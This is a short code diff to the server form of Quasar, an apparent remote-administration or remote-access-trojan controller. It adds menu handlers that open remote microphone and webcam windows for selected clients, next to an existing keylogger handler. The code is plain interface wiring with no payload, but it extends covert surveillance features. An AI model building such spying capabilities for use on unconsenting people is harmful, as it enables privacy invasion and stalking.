@@ -1,4 +1,4 @@
-﻿using Quasar.Common.Enums;
+using Quasar.Common.Enums;
 using Quasar.Common.Messages;
 using Quasar.Server.Extensions;
 using Quasar.Server.Messages;
@@ -665,6 +665,36 @@ namespace Quasar.Server.Forms
                 FrmKeylogger frmKl = FrmKeylogger.CreateNewOrGetExisting(c);
                 frmKl.Show();
                 frmKl.Focus();
+            }
+        }
+
+        private void remoteMicrophoneToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                var frmMic = FrmRemoteMicrophone.CreateNewOrGetExisting(c);
+                frmMic.Show();
+                frmMic.Focus();
+            }
+        }
+
+        private void remoteWebcamToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                var frmWebcam = FrmRemoteWebcam.CreateNewOrGetExisting(c);
+                frmWebcam.Show();
+                frmWebcam.Focus();
+            }
+        }
+
+        private void remoteWebcamAsyncToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                var frmWebcamAsync = FrmRemoteWebcamAsync.CreateNewOrGetExisting(c);
+                frmWebcamAsync.Show();
+                frmWebcamAsync.Focus();
             }
         }
 
